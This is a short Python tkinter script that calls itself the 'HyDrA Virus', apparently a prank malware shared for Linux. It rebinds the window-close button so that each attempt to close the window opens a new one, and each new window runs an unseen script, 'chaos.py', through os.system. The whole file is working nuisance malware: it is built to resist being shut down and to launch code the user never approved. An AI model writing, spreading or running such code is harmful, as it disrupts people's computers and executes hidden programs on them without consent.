from tkinter import *
import time
import os

def open():
  window=Tk()
  # add widgets here
  lbl = Label(window, text="Cut off a head, two more will take its place.", fg='black', font=("Helvetica", 16))
  lbl.place(x=10, y=10)
  lbl2 = lbl = Label(window, text="HyDrA Virus Created By WiPet, Remastered For Linux By itzBenPlaiz", fg='black', font=("Helvetica", 10))
  lbl.place(x=10, y=50)
  
  window.title("Hydra")
  window.geometry("500x100+10+20")

  window.protocol('WM_DELETE_WINDOW', open)

  os.system("python3 chaos.py")

  print("[MAIN] OH CRAP! WE'RE IN FALLBACK MODE *panik*")

window=Tk()
# add widgets here
lbl = Label(window, text="Cut off a head, two more will take its place.", fg='black', font=("Helvetica", 16))
lbl.place(x=10, y=10)
lbl2 = lbl = Label(window, text="HyDrA Virus Created By WiPet, Remastered For Linux By itzBenPlaiz", fg='black', font=("Helvetica", 10))
lbl.place(x=10, y=50)

window.title("Hydra")
window.geometry("500x100+10+20")

window.protocol('WM_DELETE_WINDOW', open)

window.mainloop()
